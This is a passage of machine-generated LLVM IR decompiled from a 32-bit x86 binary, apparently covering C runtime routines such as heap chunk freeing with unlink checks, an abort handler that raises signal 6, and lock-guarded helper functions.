  store i32 %v0_804e4e4, i32* %v3_804e4e4, align 4
  br label %dec_label_pc_804e604

dec_label_pc_804e4ec:                             ; preds = %dec_label_pc_804e494
  %v2_804e4ec = and i32 %v3_804e4bd, 2
  %v3_804e4ec = icmp eq i32 %v2_804e4ec, 0
  %v1_804e4ef = icmp eq i1 %v3_804e4ec, false
  br i1 %v1_804e4ef, label %dec_label_pc_804e5e4, label %dec_label_pc_804e4f5

dec_label_pc_804e4f5:                             ; preds = %dec_label_pc_804e4ec
  %v1_804e4f5 = or i32 %v1_804e4b8, 1
  %v3_804e4f5 = trunc i32 %v1_804e4f5 to i8
  store i32 %v1_804e4f5, i32* %eax.global-to-local, align 4
  store i8 %v3_804e4f5, i8* @global_var_8058700.140, align 256
  %v2_804e4fd = add i32 %v1_804e4c5, %v1_804e4b5
  store i32 %v2_804e4fd, i32* @esi, align 4
  %v1_804e500 = add i32 %v2_804e4fd, 4
  %v2_804e500 = inttoptr i32 %v1_804e500 to i32*
  %v3_804e500 = load i32, i32* %v2_804e500, align 4
  store i32 %v3_804e500, i32* %eax.global-to-local, align 4
  %v2_804e507 = inttoptr i32 %v1_804e4bd to i8*
  %v3_804e507 = load i8, i8* %v2_804e507, align 1
  %v4_804e507 = urem i8 %v3_804e507, 2
  %v5_804e507 = icmp eq i8 %v4_804e507, 0
  %v1_804e50b = icmp eq i1 %v5_804e507, false
  br i1 %v1_804e50b, label %dec_label_pc_804e52e, label %dec_label_pc_804e50d

dec_label_pc_804e50d:                             ; preds = %dec_label_pc_804e4f5
  %v2_804e50d = inttoptr i32 %v1_804e4b5 to i32*
  %v3_804e50d = load i32, i32* %v2_804e50d, align 4
  store i32 %v3_804e50d, i32* @ebp, align 4
  %v2_804e512 = sub i32 %v1_804e4b5, %v3_804e50d
  store i32 %v2_804e512, i32* %eax.global-to-local, align 4
  %v1_804e514 = add i32 %v2_804e512, 8
  %v2_804e514 = inttoptr i32 %v1_804e514 to i32*
  %v3_804e514 = load i32, i32* %v2_804e514, align 4
  store i32 %v3_804e514, i32* @edi, align 4
  %v1_804e517 = add i32 %v2_804e512, 12
  %v2_804e517 = inttoptr i32 %v1_804e517 to i32*
  %v3_804e517 = load i32, i32* %v2_804e517, align 4
  store i32 %v3_804e517, i32* @edx, align 4
  %v1_804e51a = add i32 %v3_804e514, 12
  %v2_804e51a = inttoptr i32 %v1_804e51a to i32*
  %v3_804e51a = load i32, i32* %v2_804e51a, align 4
  store i32 %v3_804e51a, i32* @ecx, align 4
  %v12_804e51d = icmp eq i32 %v3_804e51a, %v2_804e512
  %v1_804e51f = icmp eq i1 %v12_804e51d, false
  br i1 %v1_804e51f, label %dec_label_pc_804e55d, label %dec_label_pc_804e521

dec_label_pc_804e521:                             ; preds = %dec_label_pc_804e50d
  %v1_804e521 = add i32 %v3_804e517, 8
  %v2_804e521 = inttoptr i32 %v1_804e521 to i32*
  %v3_804e521 = load i32, i32* %v2_804e521, align 4
  %v15_804e521 = icmp eq i32 %v3_804e521, %v3_804e51a
  %v1_804e524 = icmp eq i1 %v15_804e521, false
  br i1 %v1_804e524, label %dec_label_pc_804e55d, label %dec_label_pc_804e526

dec_label_pc_804e526:                             ; preds = %dec_label_pc_804e521
  %v2_804e526 = add i32 %v3_804e50d, %v1_804e4c5
  store i32 %v2_804e526, i32* @ebx, align 4
  store i32 %v3_804e517, i32* %v2_804e51a, align 4
  %v0_804e52b = load i32, i32* @edi, align 4
  %v1_804e52b = load i32, i32* @edx, align 4
  %v2_804e52b = add i32 %v1_804e52b, 8
  %v3_804e52b = inttoptr i32 %v2_804e52b to i32*
  store i32 %v0_804e52b, i32* %v3_804e52b, align 4
  %v0_804e535.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e52e

dec_label_pc_804e52e:                             ; preds = %dec_label_pc_804e4f5, %dec_label_pc_804e526
  %v1_804e541 = phi i32 [ %v2_804e4fd, %dec_label_pc_804e4f5 ], [ %v0_804e535.pre, %dec_label_pc_804e526 ]
  %v1_804e532 = and i32 %v3_804e500, -4
  store i32 %v1_804e532, i32* @ebp, align 4
  %v1_804e535 = load i32, i32* @global_var_805872c.141, align 4
  %v12_804e535 = icmp eq i32 %v1_804e541, %v1_804e535
  br i1 %v12_804e535, label %dec_label_pc_804e58f, label %dec_label_pc_804e53d

dec_label_pc_804e53d:                             ; preds = %dec_label_pc_804e52e
  %v2_804e53d = add i32 %v1_804e541, 4
  %v3_804e53d = add i32 %v2_804e53d, %v1_804e532
  %v4_804e53d = inttoptr i32 %v3_804e53d to i32*
  %v5_804e53d = load i32, i32* %v4_804e53d, align 4
  store i32 %v5_804e53d, i32* %eax.global-to-local, align 4
  %v3_804e541 = inttoptr i32 %v2_804e53d to i32*
  store i32 %v1_804e532, i32* %v3_804e541, align 4
  %v0_804e544 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e544 = urem i32 %v0_804e544, 2
  %v2_804e544 = icmp eq i32 %v1_804e544, 0
  store i32 %v1_804e544, i32* %eax.global-to-local, align 4
  %v1_804e549 = icmp eq i1 %v2_804e544, false
  br i1 %v1_804e549, label %dec_label_pc_804e56a, label %dec_label_pc_804e54b

dec_label_pc_804e54b:                             ; preds = %dec_label_pc_804e53d
  %v0_804e54b = load i32, i32* @esi, align 4
  %v1_804e54b = add i32 %v0_804e54b, 8
  %v2_804e54b = inttoptr i32 %v1_804e54b to i32*
  %v3_804e54b = load i32, i32* %v2_804e54b, align 4
  store i32 %v3_804e54b, i32* @edx, align 4
  %v1_804e54e = add i32 %v0_804e54b, 12
  %v2_804e54e = inttoptr i32 %v1_804e54e to i32*
  %v3_804e54e = load i32, i32* %v2_804e54e, align 4
  store i32 %v3_804e54e, i32* %eax.global-to-local, align 4
  %v1_804e551 = add i32 %v3_804e54b, 12
  %v2_804e551 = inttoptr i32 %v1_804e551 to i32*
  %v3_804e551 = load i32, i32* %v2_804e551, align 4
  store i32 %v3_804e551, i32* @edi, align 4
  %v12_804e554 = icmp eq i32 %v3_804e551, %v0_804e54b
  %v1_804e556 = icmp eq i1 %v12_804e554, false
  br i1 %v1_804e556, label %dec_label_pc_804e55d, label %dec_label_pc_804e558

dec_label_pc_804e558:                             ; preds = %dec_label_pc_804e54b
  %v1_804e558 = add i32 %v3_804e54e, 8
  %v2_804e558 = inttoptr i32 %v1_804e558 to i32*
  %v3_804e558 = load i32, i32* %v2_804e558, align 4
  %v15_804e558 = icmp eq i32 %v3_804e558, %v3_804e551
  br i1 %v15_804e558, label %dec_label_pc_804e562, label %dec_label_pc_804e55d

dec_label_pc_804e55d:                             ; preds = %dec_label_pc_804e558, %dec_label_pc_804e54b, %dec_label_pc_804e521, %dec_label_pc_804e50d
  %v0_804e55d = call i32 @function_804e640()
  store i32 %v0_804e55d, i32* %eax.global-to-local, align 4
  %v1_804e562.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e562

dec_label_pc_804e562:                             ; preds = %dec_label_pc_804e558, %dec_label_pc_804e55d
  %v1_804e562 = phi i32 [ %v3_804e54b, %dec_label_pc_804e558 ], [ %v1_804e562.pre, %dec_label_pc_804e55d ]
  %v0_804e562 = phi i32 [ %v3_804e54e, %dec_label_pc_804e558 ], [ %v0_804e55d, %dec_label_pc_804e55d ]
  %v2_804e562 = add i32 %v1_804e562, 12
  %v3_804e562 = inttoptr i32 %v2_804e562 to i32*
  store i32 %v0_804e562, i32* %v3_804e562, align 4
  %v0_804e565 = load i32, i32* @ebx, align 4
  %v1_804e565 = load i32, i32* @ebp, align 4
  %v2_804e565 = add i32 %v1_804e565, %v0_804e565
  store i32 %v2_804e565, i32* @ebx, align 4
  %v0_804e567 = load i32, i32* @edx, align 4
  %v1_804e567 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e567 = add i32 %v1_804e567, 8
  %v3_804e567 = inttoptr i32 %v2_804e567 to i32*
  store i32 %v0_804e567, i32* %v3_804e567, align 4
  br label %dec_label_pc_804e56a

dec_label_pc_804e56a:                             ; preds = %dec_label_pc_804e53d, %dec_label_pc_804e562
  %v0_804e56a = load i32, i32* @global_var_805873c.159, align 4
  store i32 %v0_804e56a, i32* %eax.global-to-local, align 4
  %v0_804e56f = load i32, i32* @ecx, align 4
  %v1_804e56f = add i32 %v0_804e56f, 12
  %v2_804e56f = inttoptr i32 %v1_804e56f to i32*
  store i32 ptrtoint (i32* @global_var_8058734.143 to i32), i32* %v2_804e56f, align 4
  %v0_804e576 = load i32, i32* @ebx, align 4
  %v1_804e576 = load i32, i32* @ecx, align 4
  %v3_804e576 = add i32 %v1_804e576, %v0_804e576
  %v4_804e576 = inttoptr i32 %v3_804e576 to i32*
  store i32 %v0_804e576, i32* %v4_804e576, align 4
  %v0_804e579 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e579 = load i32, i32* @ecx, align 4
  %v2_804e579 = add i32 %v1_804e579, 8
  %v3_804e579 = inttoptr i32 %v2_804e579 to i32*
  store i32 %v0_804e579, i32* %v3_804e579, align 4
  %v0_804e57c = load i32, i32* @ecx, align 4
  %v1_804e57c = load i32, i32* %eax.global-to-local, align 4
  %v2_804e57c = add i32 %v1_804e57c, 12
  %v3_804e57c = inttoptr i32 %v2_804e57c to i32*
  store i32 %v0_804e57c, i32* %v3_804e57c, align 4
  %v0_804e57f = load i32, i32* @ebx, align 4
  %v1_804e581 = or i32 %v0_804e57f, 1
  store i32 %v1_804e581, i32* %eax.global-to-local, align 4
  %v0_804e584 = load i32, i32* @ecx, align 4
  store i32 %v0_804e584, i32* @global_var_805873c.159, align 4
  %v2_804e58a = add i32 %v0_804e584, 4
  %v3_804e58a = inttoptr i32 %v2_804e58a to i32*
  store i32 %v1_804e581, i32* %v3_804e58a, align 4
  br label %dec_label_pc_804e59f

dec_label_pc_804e58f:                             ; preds = %dec_label_pc_804e52e
  %v0_804e58f = load i32, i32* @ebx, align 4
  %v2_804e58f = add i32 %v0_804e58f, %v1_804e532
  store i32 %v2_804e58f, i32* @ebx, align 4
  %v1_804e593 = or i32 %v2_804e58f, 1
  store i32 %v1_804e593, i32* %eax.global-to-local, align 4
  %v1_804e596 = load i32, i32* @ecx, align 4
  %v2_804e596 = add i32 %v1_804e596, 4
  %v3_804e596 = inttoptr i32 %v2_804e596 to i32*
  store i32 %v1_804e593, i32* %v3_804e596, align 4
  %v0_804e599 = load i32, i32* @ecx, align 4
  store i32 %v0_804e599, i32* @global_var_805872c.141, align 4
  br label %dec_label_pc_804e59f

dec_label_pc_804e59f:                             ; preds = %dec_label_pc_804e56a, %dec_label_pc_804e58f
  %v0_804e59f = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_804e59f, 131072
  br i1 %tmp, label %dec_label_pc_804e604, label %dec_label_pc_804e5a7

dec_label_pc_804e5a7:                             ; preds = %dec_label_pc_804e59f
  %v0_804e5a7 = load i8, i8* @global_var_8058700.140, align 256
  %v1_804e5a7 = and i8 %v0_804e5a7, 2
  %v2_804e5a7 = icmp eq i8 %v1_804e5a7, 0
  br i1 %v2_804e5a7, label %dec_label_pc_804e5c0, label %dec_label_pc_804e5b0

dec_label_pc_804e5b0:                             ; preds = %dec_label_pc_804e5a7
  %v2_804e5b8 = call i32 @function_804e2d9(i32* bitcast (i8* @global_var_8058700.140 to i32*))
  store i32 %v2_804e5b8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e5c0

dec_label_pc_804e5c0:                             ; preds = %dec_label_pc_804e5a7, %dec_label_pc_804e5b0
  %v0_804e5c0 = load i32, i32* @global_var_805872c.141, align 4
  store i32 %v0_804e5c0, i32* %eax.global-to-local, align 4
  %v1_804e5c5 = add i32 %v0_804e5c0, 4
  %v2_804e5c5 = inttoptr i32 %v1_804e5c5 to i32*
  %v3_804e5c5 = load i32, i32* %v2_804e5c5, align 4
  %v1_804e5c8 = and i32 %v3_804e5c5, -4
  store i32 %v1_804e5c8, i32* %eax.global-to-local, align 4
  %v1_804e5cb = load i32, i32* @global_var_8058a44.157, align 4
  %v7_804e5cb = icmp ult i32 %v1_804e5c8, %v1_804e5cb
  br i1 %v7_804e5cb, label %dec_label_pc_804e604, label %dec_label_pc_804e5d3

dec_label_pc_804e5d3:                             ; preds = %dec_label_pc_804e5c0
  %v0_804e5d3 = load i32, i32* @global_var_8058a48.155, align 8
  store i32 %v0_804e5d3, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8058700.140 to i32), i32* @edx, align 4
  %v0_804e5dd = call i32 @function_804e24c()
  store i32 %v0_804e5dd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e604

dec_label_pc_804e5e4:                             ; preds = %dec_label_pc_804e4ec
  %v2_804e5e4 = inttoptr i32 %v1_804e4b5 to i32*
  %v3_804e5e4 = load i32, i32* %v2_804e5e4, align 4
  %v0_804e5e7 = load i32, i32* @global_var_8058a50.148, align 16
  %v1_804e5e7 = add i32 %v0_804e5e7, -1
  store i32 %v1_804e5e7, i32* @global_var_8058a50.148, align 16
  %v2_804e5ed = add i32 %v3_804e5e4, %v1_804e4c5
  store i32 %v2_804e5ed, i32* %eax.global-to-local, align 4
  %v2_804e5f0 = sub i32 %v1_804e4b5, %v3_804e5e4
  %v0_804e5f6 = load i32, i32* @global_var_8058a64.152, align 4
  %v2_804e5f6 = sub i32 %v0_804e5f6, %v2_804e5ed
  store i32 %v2_804e5f6, i32* @global_var_8058a64.152, align 4
  %v4_804e5fc = inttoptr i32 %v2_804e5f0 to i32*
  %v5_804e5fc = call i32 @function_804f648(i32* %v4_804e5fc, i32 %v2_804e5ed, i32 %v1_804e4c5, i32 %v1_804e4c5)
  store i32 %v5_804e5fc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e604

dec_label_pc_804e604:                             ; preds = %dec_label_pc_804e5c0, %dec_label_pc_804e59f, %dec_label_pc_804e5d3, %dec_label_pc_804e4cc, %dec_label_pc_804e5e4
  store i32 %v2_804e49f, i32* @eax, align 4
  %v2_804e60d = call i32 @function_804f016(i32 %v2_804e49f, i32 1)
  store i32 %v2_804e60d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e615

dec_label_pc_804e615:                             ; preds = %dec_label_pc_804e481, %dec_label_pc_804e604
  %.0 = phi i32 [ undef, %dec_label_pc_804e481 ], [ %v2_804e60d, %dec_label_pc_804e604 ]
  store i32 %v0_804e484, i32* @ebx, align 4
  store i32 %v0_804e483, i32* @esi, align 4
  store i32 %v0_804e482, i32* @edi, align 4
  store i32 %v0_804e481, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_804e5e4, { 1, 0 }
  uselistorder i32 %v0_804e576, { 1, 0 }
  uselistorder i32 %v1_804e544, { 1, 0 }
  uselistorder i32 %v2_804e53d, { 1, 0 }
  uselistorder i32 %v1_804e532, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804e541, { 1, 0 }
  uselistorder i32 %v1_804e4c5, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_804e4bd, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804e4b5, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8058700.140 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8058734.143 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805872c.141, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_804e615, { 1, 0 }
  uselistorder label %dec_label_pc_804e604, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804e5c0, { 1, 0 }
  uselistorder label %dec_label_pc_804e59f, { 1, 0 }
  uselistorder label %dec_label_pc_804e56a, { 1, 0 }
  uselistorder label %dec_label_pc_804e562, { 1, 0 }
  uselistorder label %dec_label_pc_804e52e, { 1, 0 }
}

define i32 @function_804e61d(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e61d:
  %v0_804e61d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804e62a = call i32 @function_804e2d9(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8058700.140 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_8058700.140 to i32), i32* @edx, align 4
  %v0_804e637 = load i32, i32* @ebx, align 4
  store i32 %v0_804e637, i32* @eax, align 4
  store i32 %v0_804e61d, i32* @ebx, align 4
  %v0_804e63a = call i32 @function_804e24c()
  ret i32 %v0_804e63a

; uselistorder directives
  uselistorder i32 ()* @function_804e24c, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8058700.140 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8058700.140, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @function_804e640() local_unnamed_addr {
dec_label_pc_804e640:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_804e64c = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055ca8.160 to i32))
  %v12_804e656 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e65b

dec_label_pc_804e65b:                             ; preds = %dec_label_pc_804e65b.dec_label_pc_804e65b_crit_edge, %dec_label_pc_804e640
  %v0_804e65b = phi i32 [ %v12_804e656, %dec_label_pc_804e640 ], [ %v0_804e65b.pre, %dec_label_pc_804e65b.dec_label_pc_804e65b_crit_edge ]
  %v1_804e66619 = phi i32 [ 31, %dec_label_pc_804e640 ], [ %v1_804e666, %dec_label_pc_804e65b.dec_label_pc_804e65b_crit_edge ]
  %v2_804e65b = mul i32 %v1_804e66619, 4
  %v3_804e65b = add i32 %v2_804e65b, 152
  %v4_804e65b = add i32 %v3_804e65b, %v0_804e65b
  %v5_804e65b = inttoptr i32 %v4_804e65b to i32*
  store i32 0, i32* %v5_804e65b, align 4
  %v0_804e666.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804e666 = add i32 %v0_804e666.pre, -1
  %v9_804e666 = icmp slt i32 %v1_804e666, 0
  store i32 %v1_804e666, i32* %eax.global-to-local, align 4
  %v1_804e667 = icmp eq i1 %v9_804e666, false
  br i1 %v1_804e667, label %dec_label_pc_804e65b.dec_label_pc_804e65b_crit_edge, label %dec_label_pc_804e669

dec_label_pc_804e65b.dec_label_pc_804e65b_crit_edge: ; preds = %dec_label_pc_804e65b
  %v0_804e65b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e65b

dec_label_pc_804e669:                             ; preds = %dec_label_pc_804e65b
  %v0_804e669 = load i32, i32* @ebx, align 4
  %v2_804e66d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804e66d, i32* @ebx, align 4
  %v4_804e675 = call i32 @function_8050fc4(i32 %v2_804e66d, i32 6, i32 %v0_804e669, i32 %v0_804e669)
  store i32 %v4_804e675, i32* %eax.global-to-local, align 4
  %v1_804e67d = icmp eq i32 %v4_804e675, 0
  %v1_804e67f = icmp eq i1 %v1_804e67d, false
  br i1 %v1_804e67f, label %dec_label_pc_804e68f, label %dec_label_pc_804e681

dec_label_pc_804e681:                             ; preds = %dec_label_pc_804e669
  %v3_804e687 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_804e687 = call i32 @function_804f794(i32 1, %_TYPEDEF_sigset_t* %v3_804e687, i32 0)
  store i32 %v4_804e687, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e68f

dec_label_pc_804e68f:                             ; preds = %dec_label_pc_804e669, %dec_label_pc_804e681
  %v2_804e6c74 = phi i32 [ %v4_804e675, %dec_label_pc_804e669 ], [ %v4_804e687, %dec_label_pc_804e681 ]
  %v0_804e68f = load i8, i8* @global_var_8058460.161, align 32
  %v1_804e68f = icmp eq i8 %v0_804e68f, 0
  %v1_804e696 = icmp eq i1 %v1_804e68f, false
  br i1 %v1_804e696, label %dec_label_pc_804e6c7, label %dec_label_pc_804e698

dec_label_pc_804e698:                             ; preds = %dec_label_pc_804e68f
  store i8 1, i8* @global_var_8058460.161, align 32
  br label %dec_label_pc_804e69f

dec_label_pc_804e69f:                             ; preds = %dec_label_pc_804e706, %dec_label_pc_804e698
  %v1_804e6a7 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055ca8.160 to i32))
  store i32 %v1_804e6a7, i32* %eax.global-to-local, align 4
  %v1_804e6b3 = call i32 @function_8050f88(i32 6)
  store i32 %v1_804e6b3, i32* %eax.global-to-local, align 4
  %v1_804e6bf = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055ca8.160 to i32))
  store i32 %v1_804e6bf, i32* %eax.global-to-local, align 4
  %v0_804e6c7.pre = load i8, i8* @global_var_8058460.161, align 32
  br label %dec_label_pc_804e6c7

dec_label_pc_804e6c7:                             ; preds = %dec_label_pc_804e68f, %dec_label_pc_804e69f
  %v2_804e6c7 = phi i32 [ %v2_804e6c74, %dec_label_pc_804e68f ], [ %v1_804e6bf, %dec_label_pc_804e69f ]
  %v0_804e6c7 = phi i8 [ %v0_804e68f, %dec_label_pc_804e68f ], [ %v0_804e6c7.pre, %dec_label_pc_804e69f ]
  %v1_804e6c7 = zext i8 %v0_804e6c7 to i32
  %v3_804e6c7 = and i32 %v2_804e6c7, -256
  %v4_804e6c7 = or i32 %v1_804e6c7, %v3_804e6c7
  store i32 %v4_804e6c7, i32* %eax.global-to-local, align 4
  %v10_804e6cc = icmp eq i8 %v0_804e6c7, 1
  %v1_804e6ce = icmp eq i1 %v10_804e6cc, false
  br i1 %v1_804e6ce, label %dec_label_pc_804e728, label %dec_label_pc_804e6d0

dec_label_pc_804e6d0:                             ; preds = %dec_label_pc_804e6c7
  %v2_804e6d8 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_804e6d8, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_8058460.161, align 32
  %v3_804e6e4 = bitcast i32* %stack_var_-272 to i8*
  %v4_804e6e4 = call i32 @function_804d1d0(i8* %v3_804e6e4, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e6fb

dec_label_pc_804e6fb:                             ; preds = %dec_label_pc_804e6fb.dec_label_pc_804e6fb_crit_edge, %dec_label_pc_804e6d0
  %v0_804e6fb = phi i32 [ %v12_804e656, %dec_label_pc_804e6d0 ], [ %v0_804e6fb.pre, %dec_label_pc_804e6fb.dec_label_pc_804e6fb_crit_edge ]
  %v1_804e70318 = phi i32 [ 31, %dec_label_pc_804e6d0 ], [ %v1_804e703, %dec_label_pc_804e6fb.dec_label_pc_804e6fb_crit_edge ]
  %v2_804e6fb = mul i32 %v1_804e70318, 4
  %v3_804e6fb = add i32 %v2_804e6fb, 16
  %v4_804e6fb = add i32 %v3_804e6fb, %v0_804e6fb
  %v5_804e6fb = inttoptr i32 %v4_804e6fb to i32*
  store i32 -1, i32* %v5_804e6fb, align 4
  %v0_804e703.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804e703 = add i32 %v0_804e703.pre, -1
  %v9_804e703 = icmp slt i32 %v1_804e703, 0
  store i32 %v1_804e703, i32* %eax.global-to-local, align 4
  %v1_804e704 = icmp eq i1 %v9_804e703, false
  br i1 %v1_804e704, label %dec_label_pc_804e6fb.dec_label_pc_804e6fb_crit_edge, label %dec_label_pc_804e706

dec_label_pc_804e6fb.dec_label_pc_804e6fb_crit_edge: ; preds = %dec_label_pc_804e6fb
  %v0_804e6fb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e6fb

dec_label_pc_804e706:                             ; preds = %dec_label_pc_804e6fb
  store i32 %v2_804e6d8, i32* %eax.global-to-local, align 4
  %v5_804e71b = call i32 @function_804f257(i32 6, i32* nonnull %stack_var_-272, i32 0, i32 %v1_804e703)
  store i32 %v5_804e71b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e69f

dec_label_pc_804e728:                             ; preds = %dec_label_pc_804e6c7
  %v10_804e728 = icmp eq i8 %v0_804e6c7, 2
  %v1_804e72a = icmp eq i1 %v10_804e728, false
  br i1 %v1_804e72a, label %dec_label_pc_804e734, label %dec_label_pc_804e72c

dec_label_pc_804e72c:                             ; preds = %dec_label_pc_804e728
  store i8 3, i8* @global_var_8058460.161, align 32
  br label %dec_label_pc_804e734

dec_label_pc_804e734:                             ; preds = %dec_label_pc_804e728, %dec_label_pc_804e72c
  %v0_804e734 = phi i8 [ %v0_804e6c7, %dec_label_pc_804e728 ], [ 3, %dec_label_pc_804e72c ]
  %v9_804e734 = icmp eq i8 %v0_804e734, 3
  %v1_804e73b = icmp eq i1 %v9_804e734, false
  br i1 %v1_804e73b, label %dec_label_pc_804e74e, label %dec_label_pc_804e73d

dec_label_pc_804e73d:                             ; preds = %dec_label_pc_804e734
  store i8 4, i8* @global_var_8058460.161, align 32
  %v1_804e749 = call i32 @function_804f470(i32 127)
  unreachable

dec_label_pc_804e74e:                             ; preds = %dec_label_pc_804e734, %dec_label_pc_804e74e
  br label %dec_label_pc_804e74e

; uselistorder directives
  uselistorder i32 %v1_804e703, { 0, 3, 2, 1 }
  uselistorder i8 %v0_804e6c7, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804e666, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 14, 11, 13, 12, 1 }
  uselistorder i8* @global_var_8058460.161, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804e74e, { 1, 0 }
  uselistorder label %dec_label_pc_804e734, { 1, 0 }
  uselistorder label %dec_label_pc_804e6c7, { 1, 0 }
  uselistorder label %dec_label_pc_804e68f, { 1, 0 }
}

define i32 @function_804e754(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e754:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e75c = load i32, i32* @ebx, align 4
  store i32 %v0_804e75c, i32* %stack_var_-4, align 4
  %v2_804e76a = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804e76a, i32* @ebx, align 4
  %v2_804e76f = call i32 @function_804f016(i32 %v2_804e76a, i32 134541331)
  %v1_804e77b = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055cc0.162 to i32))
  %v2_804e782 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804e78c = call i32 @function_804e935(i32* nonnull @global_var_8055cd8, i32 %v2_804e782)
  store i32 ptrtoint (i32* @global_var_8055cd8 to i32), i32* @eax, align 4
  store i32 %v2_804e782, i32* @edx, align 4
  %v2_804e796 = call i32 @function_804f016(i32 %v2_804e76a, i32 1)
  %v3_804e79b = load i32, i32* %stack_var_-8, align 4
  %v2_804e7a2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e7a2, i32* @ebx, align 4
  ret i32 %v3_804e79b
}

define i32 @function_804e7a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e7a4:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_804e7b5 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804e7b5, i32* @eax, align 4
  %v2_804e7ba = call i32 @function_804f016(i32 %v2_804e7b5, i32 134541331)
  %v1_804e7c6 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055cc0.162 to i32))
  %v0_804e7cb = load i32, i32* bitcast (i32** @global_var_8055ce0.165 to i32*), align 32
  store i32 %v0_804e7cb, i32* @ebx, align 4
  %v3_804e7dc = call i32 @function_804e89c(i32 %arg1, i32* nonnull @global_var_8055cd8)
  %v2_804e7e4 = icmp slt i32 %v3_804e7dc, 0
  br i1 %v2_804e7e4, label %dec_label_pc_804e7eb, label %dec_label_pc_804e7e8

dec_label_pc_804e7e8:                             ; preds = %dec_label_pc_804e7a4
  store i32 ptrtoint (i32** @global_var_8055cdc.166 to i32), i32* @esi, align 4
  br label %dec_label_pc_804e7eb

dec_label_pc_804e7eb:                             ; preds = %dec_label_pc_804e7a4, %dec_label_pc_804e7e8
  store i32 %v2_804e7b5, i32* @eax, align 4
  %v2_804e7f4 = call i32 @function_804f016(i32 %v2_804e7b5, i32 1)
  %v0_804e7fc = load i32, i32* @esi, align 4
  ret i32 %v0_804e7fc

; uselistorder directives
  uselistorder label %dec_label_pc_804e7eb, { 1, 0 }
}

define i32 @function_804e801(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804e801:
  %stack_var_-24 = alloca i32, align 4
  %v2_804e810 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804e810, i32* @ebx, align 4
  %v2_804e815 = call i32 @function_804f016(i32 %v2_804e810, i32 134541331)
  %v1_804e821 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055cc0.162 to i32))
  store i32 ptrtoint (i32** @global_var_8055cdc.166 to i32), i32* @esi, align 4
  %v4_804e840 = inttoptr i32 %arg2 to i32*
  %v5_804e840 = call i32 @function_804ea2d(i32 %arg1, i32* %v4_804e840, i32 %arg3, i32 ptrtoint (i32* @global_var_8055cd8 to i32))
  store i32 %v5_804e840, i32* @eax, align 4
  %v2_804e84b = call i32 @function_804f016(i32 %v2_804e810, i32 1)
